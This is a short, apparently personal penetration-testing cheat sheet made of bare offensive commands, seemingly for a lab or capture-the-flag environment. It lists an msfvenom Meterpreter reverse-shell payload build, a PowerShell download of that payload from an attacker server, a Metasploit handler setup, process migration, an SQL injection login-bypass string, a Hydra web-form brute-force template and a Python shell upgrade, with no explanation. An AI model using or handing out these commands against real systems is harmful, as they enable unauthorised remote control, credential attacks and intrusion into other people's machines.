

sql map

---

hashes.com

cyberchef.io





msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.245.232 LPORT=6667 -f exe -o shell.exe

powershell -c "Invoke-WebRequest -Uri 'http://10.10.245.232:8000/shell.exe' -OutFile 'c:\temp\shell.exe'"

msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.248.10; set lport 6666;set payload windows/meterpreter/reverse_tcp; exploit"

migrate -N explorer.exe

' or 1=1 -- -

hydra -l <username> -P <password_list> <target_ip> http-post-form "<url>:<post_data>:<failure_string>"

python -c “import pty; pty.spawn(‘/bin/bash’)”
